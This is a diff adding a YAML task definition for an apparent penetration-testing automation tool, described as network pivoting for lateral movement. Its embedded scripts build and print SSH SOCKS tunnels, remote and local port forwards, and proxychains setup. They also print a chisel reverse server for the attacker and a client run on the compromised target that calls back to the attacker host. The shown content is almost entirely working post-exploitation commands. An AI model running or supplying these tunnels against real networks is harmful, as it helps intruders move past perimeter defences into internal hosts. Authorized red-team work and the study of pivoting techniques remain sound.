@@ -1,0 +1,71 @@
+name: pivot
+description: Network pivoting — set up SSH tunnels, SOCKS proxies, port forwarding,
+  and chisel/ligolo for lateral movement.
+tags:
+- post
+- pivot
+- tunnel
+- socks
+- proxy
+- port-forward
+dispatch:
+  inputs:
+    lhost:
+      required: true
+      type: string
+      description: Attacker host/IP
+      alias: l
+    lport:
+      type: number
+      default: 1080
+      description: SOCKS proxy port on attacker
+    pivot_host:
+      type: string
+      default: ''
+      description: Pivot/jump host IP
+    target_host:
+      type: string
+      default: ''
+      description: Internal target to forward to
+    target_port:
+      type: number
+      default: 3389
+      description: Internal target port
+    method:
+      type: string
+      default: ssh
+      description: 'Method: ssh, chisel, ligolo, socat'
+    log_command:
+      type: string
+      default: 'true'
+      description: Enable command logging
+jobs:
+  ssh-tunnel:
+    name: SSH Dynamic Tunnel
+    run_if: '{{ inputs.method == ''ssh'' }}'
+    steps:
+    - name: ssh-socks
+      script: "lhost = \"{{ inputs.lhost }}\"\nlport = \"{{ inputs.lport }}\"\npivot\
+        \ = \"{{ inputs.pivot_host }}\"\n\nprint(\"[+] SSH Dynamic SOCKS Tunnel\"\
+        )\nif pivot:\n    print(f\"    ssh -D {lport} -N -f user@{pivot}\")\n    print(f\"\
+        \    Then configure proxychains: socks5 127.0.0.1 {lport}\")\nelse:\n    print(f\"\
+        \    ssh -D {lport} -N -f {lhost}\")\n\nprint(\"\\n[+] SSH Remote Port Forward\"\
+        )\nif pivot and \"{{ inputs.target_host }}\":\n    print(f\"    ssh -R {{\
+        \ inputs.target_port }}:{{ inputs.target_host }}:{{ inputs.target_port }}\
+        \ -N -f user@{pivot}\")\n\nprint(\"\\n[+] SSH Local Port Forward\")\nif \"\
+        {{ inputs.target_host }}\":\n    print(f\"    ssh -L {{ inputs.lport }}:{{\
+        \ inputs.target_host }}:{{ inputs.target_port }} -N -f user@{pivot or lhost}\"\
+        )\n\nadd_outputs(method=\"ssh\", socks_port=lport)"
+  chisel:
+    name: Chisel Tunnel
+    run_if: '{{ inputs.method == ''chisel'' }}'
+    steps:
+    - name: chisel-cmds
+      script: "lhost = \"{{ inputs.lhost }}\"\nlport = \"{{ inputs.lport }}\"\n\n\
+        print(\"[+] Chisel Tunneling\")\nprint(f\"    Server (attacker): chisel server\
+        \ -p {lport} --reverse\")\nprint(f\"    Client (target):  chisel client {lhost}:{lport}\
+        \ R:socks\")\nprint(f\"    Then configure proxychains: socks5 127.0.0.1 1080\"\
+        )\n\nif \"{{ inputs.target_host }}\":\n    print(f\"\\n[+] Chisel Port Forward\"\
+        )\n    print(f\"    Client: chisel client {lhost}:{lport} R:{{ inputs.target_port\
+        \ }}:{{ inputs.target_host }}:{{ inputs.target_port }}\")\n\nadd_outputs(method=\"\
+        chisel\", server_port=lport, server_host=lhost)"
